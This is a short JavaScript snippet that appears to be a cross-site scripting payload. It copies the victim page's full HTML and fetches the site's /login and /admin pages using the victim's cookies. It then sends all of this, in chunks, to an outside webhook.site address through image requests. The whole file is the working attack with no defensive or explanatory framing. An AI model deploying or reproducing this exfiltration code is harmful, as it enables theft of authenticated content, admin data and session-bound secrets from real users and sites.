const W = "https://webhook.site/b305eb85-951a-4ea1-aaaf-63ba3b3b0eb4";

const send = (k, v) => {
  const s = String(v);
  for (let i = 0; i < s.length; i += 1500) {
    new Image().src = `${W}?${k}${i / 1500}=${encodeURIComponent(s.slice(i, i + 1500))}`;
  }
};

send("html", document.documentElement.outerHTML);

for (const p of ["/login", "/admin"]) {
  fetch(p, { credentials: "include" })
    .then(r => r.text())
    .then(t => send(p.slice(1), t));
}